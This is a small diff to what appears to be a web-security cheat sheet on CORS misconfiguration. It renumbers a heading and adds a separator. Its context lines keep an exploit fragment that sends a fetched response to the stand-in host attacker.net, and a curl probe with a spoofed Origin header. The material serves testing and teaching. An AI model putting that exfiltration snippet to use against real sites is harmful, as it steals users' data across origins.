@@ -902,9 +902,7 @@ function reqListener() {
     location='//attacker.net/log?key='+this.responseText; 
 };
 ```
-
-
-5. Check for internal applications (same-site origin).
+3. Vulnerable Implementation (Example 2) - Check for internal applications (same-site origin).
 
 ### Insecure Configurations Detection (Response Headers):
 ```bash
@@ -942,6 +940,7 @@ Access-Control-Allow-Credentials: true
 ```bash
 curl http://any.com -H "Origin: http://www.bing.com" -I
 ```
+----- 
 
 ## 2. CRLF Injection
 
